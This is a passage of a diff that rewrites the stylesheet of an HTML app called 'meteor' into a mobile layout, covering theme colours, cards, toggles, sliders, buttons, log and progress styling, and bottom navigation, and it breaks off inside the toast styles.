@@ -1,1543 +1,1272 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>meteor</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+<meta name="theme-color" content="#0a0a0f" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="mobile-web-app-capable" content="yes" />
+<title>meteor — Mobile</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 
-        :root {
-            --bg-primary: #0b0b12;
-            --bg-secondary: #13131e;
-            --bg-card: rgba(20, 20, 32, 0.8);
-            --bg-input: #1a1a2a;
-            --border-color: #2a2a42;
-            --text-primary: #f0eeff;
-            --text-secondary: #a8a4c8;
-            --text-dim: #6a6a8a;
-            --accent: #8b7aff;
-            --accent-glow: rgba(139, 122, 255, 0.25);
-            --shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
-            --radius: 20px;
-            --transition: 0.35s cubic-bezier(0.22, 1, 0.36, 1);
-        }
+:root{
+  --bg:#0a0a0f;
+  --bg-secondary:#12121a;
+  --bg-card:#16161f;
+  --bg-elevated:#1c1c28;
+  --border:#26263a;
+  --border-soft:rgba(255,255,255,0.06);
+  --text:#f0eeff;
+  --text-soft:#a8a4c8;
+  --text-dim:#6a6a8a;
+  --accent:#7775F2;
+  --accent-glow:rgba(119,117,242,0.3);
+  --green:#10C550;
+  --yellow:#ECA201;
+  --blue:#257AF7;
+  --red:#EF4F1D;
+  --radius:18px;
+  --radius-sm:14px;
+  --radius-xs:10px;
+  --speed:0.3s;
+  --ease:cubic-bezier(0.22,1,0.36,1);
+  --ease-bounce:cubic-bezier(0.22,1.4,0.4,1);
+  --safe-top:env(safe-area-inset-top,0px);
+  --safe-bottom:env(safe-area-inset-bottom,0px);
+  --safe-left:env(safe-area-inset-left,0px);
+  --safe-right:env(safe-area-inset-right,0px);
+}
 
-        [data-theme="light"] {
-            --bg-primary: #f0f0f8;
-            --bg-secondary: #e4e4ec;
-            --bg-card: rgba(255, 255, 255, 0.85);
-            --bg-input: #ececf4;
-            --border-color: #d0d0e0;
-            --text-primary: #1a1a2e;
-            --text-secondary: #4a4a62;
-            --text-dim: #8a8aa2;
-            --shadow: 0 8px 40px rgba(0, 0, 0, 0.08);
-        }
+body[data-theme="light"]{
+  --bg:#f2f2f8;
+  --bg-secondary:#e8e8f0;
+  --bg-card:#ffffff;
+  --bg-elevated:#f8f8fc;
+  --border:#d8d8e4;
+  --border-soft:rgba(0,0,0,0.06);
+  --text:#1a1a2e;
+  --text-soft:#5a5a72;
+  --text-dim:#8a8aa2;
+}
 
-        body {
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            font-family: 'Inter', -apple-system, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            transition: background var(--transition), color var(--transition);
-            overflow-x: hidden;
-        }
+body[data-theme="midnight"]{
+  --bg:#050508;
+  --bg-secondary:#0a0a12;
+  --bg-card:#0f0f18;
+  --bg-elevated:#141420;
+  --border:#1a1a2a;
+}
 
-        .bg-glow {
-            position: fixed;
-            top: -30%;
-            left: -20%;
-            width: 70%;
-            height: 70%;
-            background: radial-gradient(ellipse, rgba(139, 122, 255, 0.08), transparent 70%);
-            pointer-events: none;
-            z-index: 0;
-            animation: floatGlow 20s ease-in-out infinite alternate;
-        }
-        .bg-glow:nth-child(2) {
-            top: 40%;
-            right: -10%;
-            left: auto;
-            width: 50%;
-            height: 50%;
-            background: radial-gradient(ellipse, rgba(139, 122, 255, 0.05), transparent 70%);
-            animation-delay: -7s;
-        }
-        @keyframes floatGlow {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(60px, -40px) scale(1.2); }
-        }
+html,body{
+  height:100%;
+  height:100dvh;
+  overflow:hidden;
+  overscroll-behavior:none;
+  position:fixed;
+  width:100%;
+}
 
-        #particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-        .particle {
-            position: absolute;
-            background: rgba(139, 122, 255, 0.15);
-            border-radius: 50%;
-            animation: floatParticle linear infinite;
-        }
-        @keyframes floatParticle {
-            0% { transform: translateY(100vh) translateX(0) scale(0); opacity: 0; }
-            10% { opacity: 1; transform: translateY(80vh) translateX(20px) scale(1); }
-            90% { opacity: 0.6; }
-            100% { transform: translateY(-20vh) translateX(-30px) scale(0.5); opacity: 0; }
-        }
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:15px;
+  line-height:1.4;
+  color:var(--text);
+  background:var(--bg);
+  -webkit-font-smoothing:antialiased;
+  -webkit-user-select:none;
+  user-select:none;
+  transition:color .3s,background .3s;
+}
 
-        .header {
-            position: relative;
-            z-index: 10;
-            text-align: center;
-            padding: 16px 0 24px;
-            width: 100%;
-            max-width: 900px;
-        }
-        .brand {
-            font-size: 2.8rem;
-            font-weight: 700;
-            letter-spacing: -1px;
-            background: linear-gradient(135deg, var(--accent), #b8aaff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .brand span {
-            background: none;
-            -webkit-text-fill-color: var(--text-dim);
-        }
-        /* .subtitle убран */
+input,textarea{-webkit-user-select:text;user-select:text}
 
-        .nav-center {
-            position: relative;
-            z-index: 10;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px;
-            padding: 8px;
-            background: var(--bg-secondary);
-            border-radius: 60px;
-            border: 1px solid var(--border-color);
-            max-width: 700px;
-            width: 100%;
-            margin: 0 auto 28px;
-            transition: background var(--transition), border-color var(--transition);
-            box-shadow: var(--shadow);
-        }
-        .nav-btn {
-            padding: 10px 22px;
-            border-radius: 40px;
-            border: none;
-            background: transparent;
-            color: var(--text-secondary);
-            font-weight: 600;
-            font-size: 0.85rem;
-            cursor: pointer;
-            transition: all var(--transition);
-            font-family: inherit;
-            letter-spacing: 0.3px;
-            position: relative;
-        }
-        .nav-btn:hover {
-            color: var(--text-primary);
-            background: rgba(139, 122, 255, 0.08);
-        }
-        .nav-btn.active {
-            background: var(--accent);
-            color: #fff;
-            box-shadow: 0 4px 20px var(--accent-glow);
-        }
-        .nav-btn i {
-            margin-right: 8px;
-            font-style: normal;
-        }
+button,input,select,textarea{font:inherit;color:inherit;font-family:inherit}
+button{cursor:pointer;border:none;background:none;touch-action:manipulation}
+svg{display:block}
 
-        .main {
-            position: relative;
-            z-index: 10;
-            max-width: 1100px;
-            width: 100%;
-            flex: 1;
-        }
+/* ---------- BACKGROUND ---------- */
+.bg{
+  position:fixed;inset:0;z-index:0;overflow:hidden;
+  background:radial-gradient(ellipse at 20% 10%,rgba(119,117,242,0.08),transparent 55%),
+             radial-gradient(ellipse at 85% 90%,rgba(37,122,247,0.06),transparent 55%),
+             var(--bg);
+}
+body[data-theme="light"] .bg{
+  background:radial-gradient(ellipse at 20% 10%,rgba(119,117,242,0.05),transparent 55%),
+             radial-gradient(ellipse at 85% 90%,rgba(37,122,247,0.04),transparent 55%),
+             var(--bg);
+}
+.bg-glow{
+  position:absolute;border-radius:50%;filter:blur(80px);opacity:.4;will-change:transform;
+  animation:floatGlow 24s ease-in-out infinite;
+}
+.bg-glow.a{width:320px;height:320px;background:radial-gradient(circle,#7775F2 0%,transparent 70%);top:-100px;left:-80px}
+.bg-glow.b{width:280px;height:280px;background:radial-gradient(circle,#257AF7 0%,transparent 70%);bottom:-80px;right:-60px;animation-delay:-8s}
+@keyframes floatGlow{
+  0%,100%{transform:translate(0,0) scale(1)}
+  50%{transform:translate(30px,-20px) scale(1.1)}
+}
 
-        .page {
-            display: none;
-            animation: fadeSlide 0.4s ease;
-        }
-        .page.active {
-            display: block;
-        }
+/* ---------- APP SHELL ---------- */
+.app{
+  position:fixed;inset:0;z-index:10;
+  display:flex;flex-direction:column;
+  padding-top:var(--safe-top);
+  padding-bottom:var(--safe-bottom);
+  padding-left:var(--safe-left);
+  padding-right:var(--safe-right);
+}
 
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(16px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+/* ---------- HEADER ---------- */
+.app-header{
+  flex:0 0 auto;
+  display:flex;align-items:center;gap:10px;
+  padding:12px 16px;
+  background:var(--bg-secondary);
+  border-bottom:1px solid var(--border);
+  position:relative;z-index:5;
+}
+.app-logo{
+  width:34px;height:34px;border-radius:10px;
+  background:linear-gradient(135deg,var(--accent),#a6b8ff);
+  display:grid;place-items:center;color:#fff;
+  box-shadow:0 4px 14px var(--accent-glow);
+  flex-shrink:0;
+  font-size:16px;
+}
+.app-title{display:flex;flex-direction:column;line-height:1.1;flex:1;min-width:0}
+.app-title b{font-size:15px;font-weight:700;letter-spacing:-.2px}
+.app-title span{font-size:10.5px;color:var(--text-dim);display:flex;align-items:center;gap:4px;margin-top:1px}
+.dot-online{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 8px rgba(16,197,80,.7);display:inline-block}
+.header-stats{
+  display:flex;gap:10px;font-size:10.5px;color:var(--text-dim);
+}
+.header-stats b{color:var(--text);font-weight:600;font-variant-numeric:tabular-nums;display:block;font-size:12px}
+.header-stats .stat{text-align:right;line-height:1.2}
 
-        .card {
-            background: var(--bg-card);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius);
-            padding: 24px 28px;
-            margin-bottom: 22px;
-            transition: background var(--transition), border-color var(--transition), box-shadow var(--transition), transform 0.25s ease;
-            box-shadow: var(--shadow);
-        }
-        .card:hover {
-            border-color: var(--accent);
-            transform: translateY(-3px);
-            box-shadow: var(--shadow), 0 0 40px var(--accent-glow);
-        }
-        .card-title {
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: var(--text-dim);
-            margin-bottom: 16px;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 10px;
-            transition: color var(--transition), border-color var(--transition);
-        }
+/* ---------- CONTENT ---------- */
+.app-content{
+  flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;
+  padding:16px 14px 20px;
+  -webkit-overflow-scrolling:touch;
+  overscroll-behavior:contain;
+  scrollbar-width:none;
+}
+.app-content::-webkit-scrollbar{display:none}
 
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-        .stat-box {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 16px 20px;
-            text-align: center;
-            transition: background var(--transition), border-color var(--transition);
-        }
-        .stat-num {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: var(--text-primary);
-            transition: color var(--transition);
-        }
-        .stat-label {
-            font-size: 0.6rem;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            margin-top: 4px;
-        }
+.panel{display:none;animation:panelIn .35s var(--ease)}
+.panel.active{display:block}
+@keyframes panelIn{
+  from{opacity:0;transform:translateY(8px)}
+  to{opacity:1;transform:translateY(0)}
+}
 
-        .progress-bar {
-            background: var(--bg-input);
-            border-radius: 30px;
-            height: 5px;
-            overflow: hidden;
-            margin: 12px 0;
-            transition: background var(--transition);
-        }
-        .progress-fill {
-            background: linear-gradient(90deg, var(--accent), #b8aaff);
-            height: 100%;
-            width: 0%;
-            transition: width 0.15s linear;
-            border-radius: 30px;
-        }
+.panel-head{margin-bottom:16px;padding:0 2px}
+.panel-head h1{font-size:22px;font-weight:700;letter-spacing:-.4px;margin-bottom:2px}
+.panel-head p{font-size:12.5px;color:var(--text-dim)}
 
-        .grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 22px;
-        }
-        .grid-3 {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 22px;
-        }
+/* ---------- CARDS ---------- */
+.card{
+  position:relative;padding:16px;
+  border-radius:var(--radius-sm);
+  background:var(--bg-card);
+  border:1px solid var(--border);
+  box-shadow:0 2px 12px rgba(0,0,0,0.2);
+  margin-bottom:12px;
+}
+.card-title{
+  font-size:10.5px;font-weight:700;letter-spacing:.7px;
+  text-transform:uppercase;color:var(--text-dim);
+  margin-bottom:12px;
+}
 
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 0.7rem;
-            color: var(--text-dim);
-            margin-bottom: 5px;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            transition: color var(--transition);
-        }
-        .input-group input,
-        .input-group select {
-            width: 100%;
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 11px 16px;
-            color: var(--text-primary);
-            font-family: inherit;
-            font-size: 0.95rem;
-            transition: background var(--transition), border-color var(--transition), color var(--transition);
-            outline: none;
-        }
-        .input-group input:focus,
-        .input-group select:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px var(--accent-glow);
-        }
+/* ---------- SECTIONS ---------- */
+.section{
+  margin-bottom:12px;
+  border-radius:var(--radius-sm);
+  background:var(--bg-secondary);
+  border:1px solid var(--border);
+  overflow:hidden;
+}
+.section-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 16px;
+  cursor:pointer;
+  user-select:none;
+  -webkit-tap-highlight-color:transparent;
+  transition:background .2s;
+  min-height:56px;
+}
+.section-header:active{background:rgba(255,255,255,0.03)}
+body[data-theme="light"] .section-header:active{background:rgba(0,0,0,0.03)}
+.section-title{font-size:14px;font-weight:600;color:var(--text)}
+.section-desc{font-size:11.5px;color:var(--text-dim);margin-top:2px;line-height:1.35}
+.section-body{padding:4px 16px 14px;border-top:1px solid var(--border)}
+.section-body.collapsed{display:none}
+.chev{transition:transform .25s var(--ease);color:var(--text-dim);display:flex;flex-shrink:0;margin-left:8px}
 
-        .btn {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            padding: 11px 0;
-            width: 100%;
-            border-radius: 30px;
-            font-weight: 600;
-            color: var(--text-primary);
-            cursor: pointer;
-            transition: all var(--transition);
-            font-family: inherit;
-            font-size: 0.95rem;
-            letter-spacing: 0.3px;
-        }
-        .btn:hover {
-            background: var(--accent);
-            border-color: var(--accent);
-            color: #fff;
-            transform: scale(0.98);
-            box-shadow: 0 4px 20px var(--accent-glow);
-        }
-        .btn-danger {
-            background: rgba(239, 68, 68, 0.15);
-            border-color: rgba(239, 68, 68, 0.3);
-            color: #f87171;
-        }
-        .btn-danger:hover {
-            background: #ef4444;
-            border-color: #ef4444;
-            color: #fff;
-        }
-        .btn-success {
-            background: rgba(34, 197, 94, 0.15);
-            border-color: rgba(34, 197, 94, 0.3);
-            color: #6ee7b7;
-        }
-        .btn-success:hover {
-            background: #22c55e;
-            border-color: #22c55e;
-            color: #fff;
-        }
+/* ---------- CONTROLS ---------- */
+.ctrl-row{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:12px;
+  padding:14px 0;
+  min-height:56px;
+  border-bottom:1px solid var(--border-soft);
+}
+.ctrl-row:last-child{border-bottom:none}
+.ctrl-row .lbl{
+  font-size:14px;color:var(--text);font-weight:500;
+  display:flex;flex-direction:column;gap:2px;
+  flex:1;min-width:0;
+}
+.ctrl-row .lbl .desc{
+  font-size:11.5px;color:var(--text-dim);font-weight:400;
+  line-height:1.35;
+}
 
-        .log-area {
-            background: var(--bg-input);
-            border-radius: 14px;
-            padding: 12px 16px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: 'Fira Code', 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            border: 1px solid var(--border-color);
-            margin-top: 14px;
-            transition: background var(--transition), border-color var(--transition);
-        }
-        .log-line {
-            padding: 4px 0;
-            border-bottom: 1px solid var(--border-color);
-            transition: border-color var(--transition);
-            color: var(--text-secondary);
-        }
-        .log-success {
-            color: #6ee7b7;
-        }
-        .log-error {
-            color: #f87171;
-        }
-        .log-info {
-            color: var(--text-secondary);
-        }
+/* Toggle — увеличен для touch */
+.toggle{
+  position:relative;width:50px;height:30px;border-radius:99px;flex-shrink:0;
+  background:rgba(255,255,255,0.1);
+  border:1px solid rgba(255,255,255,0.1);
+  transition:background .3s var(--ease);
+  box-shadow:inset 0 1px 3px rgba(0,0,0,0.3);
+}
+body[data-theme="light"] .toggle{background:rgba(0,0,0,0.08);border-color:rgba(0,0,0,0.08)}
+.toggle::after{
+  content:'';position:absolute;top:2px;left:2px;width:24px;height:24px;border-radius:50%;
+  background:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.35);
+  transition:transform .35s var(--ease-bounce);
+}
+.toggle.on{background:var(--accent);border-color:var(--accent)}
+.toggle.on::after{transform:translateX(20px)}
 
-        .report-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            z-index: 1000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            animation: fadeIn 0.25s ease;
-        }
-        .report-modal.active {
-            display: flex;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        .report-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--border-color);
-            border-radius: 28px;
-            max-width: 750px;
-            width: 100%;
-            max-height: 85vh;
-            padding: 30px 34px;
-            overflow-y: auto;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            animation: slideUp 0.3s ease;
-            transition: background var(--transition), border-color var(--transition);
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .report-card h2 {
-            font-size: 1.4rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 14px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 12px;
-            transition: color var(--transition), border-color var(--transition);
-        }
-        .report-card .report-data {
-            font-family: 'Fira Code', 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            white-space: pre-wrap;
-            line-height: 1.8;
-            color: var(--text-secondary);
-            transition: color var(--transition);
-        }
-        .report-actions {
-            display: flex;
-            gap: 14px;
-            margin-top: 24px;
-            flex-wrap: wrap;
-        }
-        .report-actions button {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            padding: 10px 22px;
-            border-radius: 40px;
-            color: var(--text-primary);
-            font-weight: 600;
-            cursor: pointer;
-            transition: all var(--transition);
-            flex: 1;
-            min-width: 100px;
-            font-family: inherit;
-        }
-        .report-actions button:hover {
-            background: var(--accent);
-            border-color: var(--accent);
-            color: #fff;
-        }
-        .report-actions .close-report {
-            background: transparent;
-            border-color: var(--border-color);
-            color: var(--text-dim);
-        }
-        .report-actions .close-report:hover {
-            background: rgba(239, 68, 68, 0.15);
-            border-color: #ef4444;
-            color: #f87171;
-        }
+/* Slider — full width на мобиле */
+.slider-row{
+  display:flex;flex-direction:column;gap:10px;
+  padding:14px 0;
+  min-height:64px;
+  border-bottom:1px solid var(--border-soft);
+}
+.slider-row:last-child{border-bottom:none}
+.slider-row .top{
+  display:flex;align-items:center;justify-content:space-between;gap:12px;
+}
+.slider-row .lbl{font-size:14px;color:var(--text);font-weight:500}
+.slider-row .desc{font-size:11.5px;color:var(--text-dim);margin-top:2px}
+.slider-row .val{
+  font-size:14px;font-weight:700;color:var(--accent);
+  font-variant-numeric:tabular-nums;
+  padding:4px 10px;border-radius:8px;
+  background:var(--accent-glow);
+  min-width:50px;text-align:center;
+}
+input[type=range]{
+  -webkit-appearance:none;appearance:none;
+  width:100%;height:8px;border-radius:99px;
+  background:rgba(255,255,255,0.1);outline:none;
+}
+body[data-theme="light"] input[type=range]{background:rgba(0,0,0,0.1)}
+input[type=range]::-webkit-slider-thumb{
+  -webkit-appearance:none;appearance:none;
+  width:26px;height:26px;border-radius:50%;
+  background:#fff;cursor:pointer;
+  box-shadow:0 2px 10px rgba(0,0,0,0.5),0 0 0 3px var(--accent);
+  transition:transform .15s var(--ease-bounce);
+}
+input[type=range]::-webkit-slider-thumb:active{transform:scale(1.15)}
+input[type=range]::-moz-range-thumb{
+  width:26px;height:26px;border-radius:50%;border:none;background:#fff;cursor:pointer;
+  box-shadow:0 2px 10px rgba(0,0,0,0.5),0 0 0 3px var(--accent);
+}
 
-        .theme-group {
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .theme-btn {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            padding: 8px 20px;
-            border-radius: 30px;
-            cursor: pointer;
-            color: var(--text-secondary);
-            font-weight: 500;
-            transition: all var(--transition);
-            font-family: inherit;
-            font-size: 0.85rem;
-        }
-        .theme-btn:hover {
-            border-color: var(--accent);
-            color: var(--text-primary);
-        }
-        .theme-btn.active {
-            background: var(--accent);
-            border-color: var(--accent);
-            color: #fff;
-        }
+/* Select — увеличен для touch */
+.gselect{
+  appearance:none;-webkit-appearance:none;
+  padding:10px 32px 10px 14px;border-radius:var(--radius-xs);
+  font-size:14px;font-weight:500;
+  background-color:var(--bg-elevated);
+  border:1px solid var(--border);
+  color:var(--text);cursor:pointer;outline:none;
+  background-image:url("data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236a6a8a' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 10px center;
+  min-width:120px;
+  -webkit-appearance:none;
+}
+.gselect:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
 
-        .setting-toggle {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 8px 0;
-        }
-        .toggle {
-            width: 44px;
-            height: 24px;
-            background: var(--bg-input);
-            border-radius: 30px;
-            cursor: pointer;
-            transition: background var(--transition);
-            position: relative;
-            border: 1px solid var(--border-color);
-        }
-        .toggle.active {
-            background: var(--accent);
-            border-color: var(--accent);
-        }
-        .toggle::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 18px;
-            height: 18px;
-            background: #fff;
-            border-radius: 50%;
-            transition: transform var(--transition);
-        }
-        .toggle.active::after {
-            transform: translateX(20px);
-        }
+/* Buttons */
+.gbtn{
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  padding:14px 20px;border-radius:var(--radius-xs);
+  font-size:14px;font-weight:600;
+  background:var(--bg-elevated);
+  border:1px solid var(--border);
+  color:var(--text);
+  transition:transform .15s var(--ease-bounce),background .2s,border-color .2s;
+  min-height:48px;
+  -webkit-tap-highlight-color:transparent;
+}
+.gbtn:active{transform:scale(.96);background:rgba(255,255,255,0.08)}
+.gbtn.primary{
+  background:linear-gradient(180deg,var(--accent),#5b5cf0);
+  color:#fff;border-color:transparent;
+  box-shadow:0 4px 16px var(--accent-glow);
+}
+.gbtn.primary:active{background:linear-gradient(180deg,#6b6aff,#4b4ce0)}
+.gbtn.danger{color:#ff8a9e;border-color:rgba(239,79,29,0.3);background:rgba(239,79,29,0.12)}
+.gbtn.danger:active{background:var(--red);color:#fff;border-color:transparent}
+.gbtn.success{color:#7ef0a8;border-color:rgba(16,197,80,0.3);background:rgba(16,197,80,0.12)}
+.gbtn.warning{color:#ffd166;border-color:rgba(236,162,1,0.3);background:rgba(236,162,1,0.12)}
+.gbtn.ghost{background:transparent;border-color:var(--border)}
+.gbtn svg{width:16px;height:16px;stroke:currentColor;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
+.gbtn.block{width:100%}
+.gbtn:disabled{opacity:.5;transform:none!important}
 
-        .footer {
-            text-align: center;
-            padding: 20px 0 10px;
-            font-size: 0.7rem;
-            color: var(--text-dim);
-            border-top: 1px solid var(--border-color);
-            margin-top: 20px;
-            transition: border-color var(--transition);
-        }
+/* Inputs — крупнее и с правильными keyboard типами */
+input[type=text],input[type=email],input[type=tel],input[type=number],textarea{
+  width:100%;padding:14px 16px;border-radius:var(--radius-xs);
+  font-size:16px; /* предотвращает zoom на iOS */
+  background:var(--bg-elevated);
+  border:1px solid var(--border);
+  color:var(--text);outline:none;
+  transition:border-color .2s,box-shadow .2s;
+  font-family:inherit;
+  -webkit-appearance:none;
+}
+input:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
+input::placeholder{color:var(--text-dim)}
 
-        .settings-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-        }
-        @media (max-width: 860px) {
-            .settings-grid {
-                grid-template-columns: 1fr;
-            }
-            .grid-2,
-            .grid-3 {
-                grid-template-columns: 1fr;
-            }
-            .nav-center {
-                border-radius: 30px;
-                padding: 6px;
-                gap: 4px;
-            }
-            .nav-btn {
-                padding: 8px 14px;
-                font-size: 0.75rem;
-            }
-            .brand {
-                font-size: 2rem;
-            }
-            .header {
-                padding: 10px 0 16px;
-            }
-            .card {
-                padding: 18px 20px;
-            }
-            .report-card {
-                padding: 20px;
-            }
-        }
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-            }
-            .nav-btn {
-                padding: 6px 10px;
-                font-size: 0.65rem;
-            }
-            .nav-btn i {
-                margin-right: 4px;
-            }
-            .brand {
-                font-size: 1.6rem;
-            }
-            .stat-num {
-                font-size: 1.3rem;
-            }
-            .card {
-                padding: 14px 16px;
-                margin-bottom: 14px;
-            }
-        }
-    </style>
+.input-group{margin-bottom:12px}
+.input-group label{
+  display:block;font-size:11px;color:var(--text-dim);
+  margin-bottom:6px;text-transform:uppercase;letter-spacing:.6px;font-weight:600;
+}
+
+/* ---------- STATS ---------- */
+.stat-grid{
+  display:grid;grid-template-columns:repeat(2,1fr);gap:10px;
+  margin-bottom:16px;
+}
+.stat-card{
+  padding:14px 14px;
+  border-radius:var(--radius-sm);
+  background:var(--bg-card);
+  border:1px solid var(--border);
+}
+.stat-card .label{
+  font-size:10px;text-transform:uppercase;letter-spacing:.7px;
+  color:var(--text-dim);font-weight:600;margin-bottom:6px;
+}
+.stat-card .val{
+  font-size:24px;font-weight:700;
+  font-variant-numeric:tabular-nums;letter-spacing:-.5px;
+  line-height:1.1;
+}
+.stat-card .val.accent{color:var(--accent)}
+.stat-card .val.green{color:var(--green)}
+.stat-card .val.yellow{color:var(--yellow)}
+
+/* ---------- LOG AREA ---------- */
+.log-area{
+  background:rgba(0,0,0,0.32);
+  border-radius:var(--radius-xs);
+  padding:12px 14px;
+  max-height:220px;
+  overflow-y:auto;
+  font-family:ui-monospace,Menlo,Consolas,monospace;
+  font-size:12px;
+  border:1px solid var(--border);
+  margin-top:12px;
+  line-height:1.6;
+  -webkit-overflow-scrolling:touch;
+}
+body[data-theme="light"] .log-area{background:rgba(0,0,0,0.04)}
+.log-area::-webkit-scrollbar{width:4px}
+.log-area::-webkit-scrollbar-thumb{background:rgba(119,117,242,0.3);border-radius:4px}
+.log-line{padding:3px 0;color:var(--text-soft);word-break:break-word}
+.log-success{color:#7ef0a8}
+.log-error{color:#ff8a9e}
+.log-info{color:var(--text-soft)}
+.log-warn{color:#ffd166}
+
+/* ---------- PROGRESS ---------- */
+.progress-bar{
+  background:rgba(255,255,255,0.08);
+  border-radius:99px;height:6px;overflow:hidden;margin:10px 0;
+}
+.progress-fill{
+  background:linear-gradient(90deg,var(--accent),#a6b8ff);
+  height:100%;width:0%;transition:width .15s linear;border-radius:99px;
+}
+
+/* ---------- BOTTOM NAV ---------- */
+.bottom-nav{
+  flex:0 0 auto;
+  display:flex;
+  background:var(--bg-secondary);
+  border-top:1px solid var(--border);
+  padding:6px 4px calc(6px + var(--safe-bottom));
+  position:relative;
+  z-index:5;
+}
+.nav-item{
+  flex:1;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;
+  padding:8px 4px;
+  border-radius:12px;
+  font-size:10px;font-weight:600;
+  color:var(--text-dim);
+  transition:color .2s,background .2s,transform .15s var(--ease-bounce);
+  min-height:56px;
+  position:relative;
+  -webkit-tap-highlight-color:transparent;
+}
+.nav-item svg{width:22px;height:22px;stroke:currentColor;stroke-width:1.8;fill:none;stroke-linecap:round;stroke-linejoin:round;transition:transform .2s var(--ease-bounce)}
+.nav-item:active{transform:scale(.94)}
+.nav-item.active{color:var(--accent)}
+.nav-item.active svg{transform:scale(1.1)}
+.nav-item.active::after{
+  content:'';position:absolute;top:2px;left:50%;transform:translateX(-50%);
+  width:20px;height:3px;border-radius:3px;
+  background:var(--accent);
+  box-shadow:0 0 12px var(--accent);
+}
+.nav-item .badge{
+  position:absolute;top:4px;right:calc(50% - 20px);
+  background:var(--red);color:#fff;
+  font-size:9px;font-weight:700;
+  min-width:16px;height:16px;border-radius:8px;
+  display:grid;place-items:center;padding:0 4px;
+}
+
+/* ---------- TOASTS — сверху, full-width на мобиле ---------- */
+.toasts{
+  position:fixed;
+  top:calc(var(--safe-top) + 8px);
+  left:8px;right:8px;
+  z-index:1000;
+  display:flex;flex-direction:column;gap:8px;
